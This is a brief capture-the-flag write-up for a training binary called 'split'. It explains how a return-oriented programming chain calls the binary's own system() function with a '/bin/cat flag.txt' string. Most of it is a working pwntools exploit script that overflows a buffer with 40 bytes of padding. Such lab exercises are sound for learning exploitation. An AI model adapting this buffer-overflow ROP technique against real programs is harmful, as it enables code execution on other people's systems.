# split
this was an interesting one, learned about function calls with paramters using rop.call().

We call the system function which is already present in the binary and give it the argument of `usefulString` which is an “export/variable” in the program with the value of `/bin/cat flag.txt`

```text-x-python
from pwn import *

context.binary = binary = './split'
elf = ELF(binary)
rop = ROP(elf)

padding = b"A"*40
rop.call(elf.symbols.system, [elf.symbols.usefulString])

payload = flat(
        padding, rop.chain())

io = process(binary)

io.recvuntil(b'> ')
io.sendline(payload)

io.interactive()
```
